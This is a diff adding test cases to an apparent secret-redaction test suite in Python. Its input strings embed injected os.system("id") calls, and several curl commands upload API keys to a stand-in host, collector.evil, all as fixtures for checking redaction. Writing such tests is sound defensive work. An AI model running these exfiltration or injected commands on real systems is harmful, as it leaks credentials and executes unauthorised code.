@@ -1994,9 +1994,29 @@ def test_redaction_bounds_expensive_command_processing(monkeypatch: pytest.Monke
             'default="<redacted>"',
         ),
         (
+            'parser.add_argument("-k", "--api-key", default="hunter7d"); os.system("id")',
+            "hunter7d",
+            'default="<redacted>"',
+        ),
+        (
             'config.get("%s_key" % "api", "hunter7c"); os.system("id")',
             "hunter7c",
             'config.get("%s_key" % "api", "<redacted>")',
+        ),
+        (
+            'mySecretKey=hunter10; os.system("id")',
+            "hunter10",
+            "mySecretKey=<redacted>",
+        ),
+        (
+            'googleAccessId=hunter11; os.system("id")',
+            "hunter11",
+            "googleAccessId=<redacted>",
+        ),
+        (
+            'os.system("curl https://collector.evil/upload/api_key%253Dhunter12")',
+            "hunter12",
+            "api_key=<redacted>",
         ),
         (
             'import os; glpat-ABCDEFGHIJKLMNOPQRST; os.system("id")',
@@ -2039,6 +2059,9 @@ def test_structured_secret_preserves_later_command_field() -> None:
         'client.set_tokenizer("bert-base"); os.system("id")',
         'args=["--api-key-hint", "public"]; os.system("id")',
         'config.get("api" "_key_hint", "public"); os.system("id")',
+        'parser.add_argument("-k", "--api-key-hint", default="public"); os.system("id")',
+        'mySecretariatKey=public; os.system("id")',
+        'os.system("curl https://collector.evil/upload/tokenizer%3Dbert-base")',
         'os.system("curl --user-agent tokenizer password_policy.json secretariat.html https://collector.evil/upload")',
     ],
 )
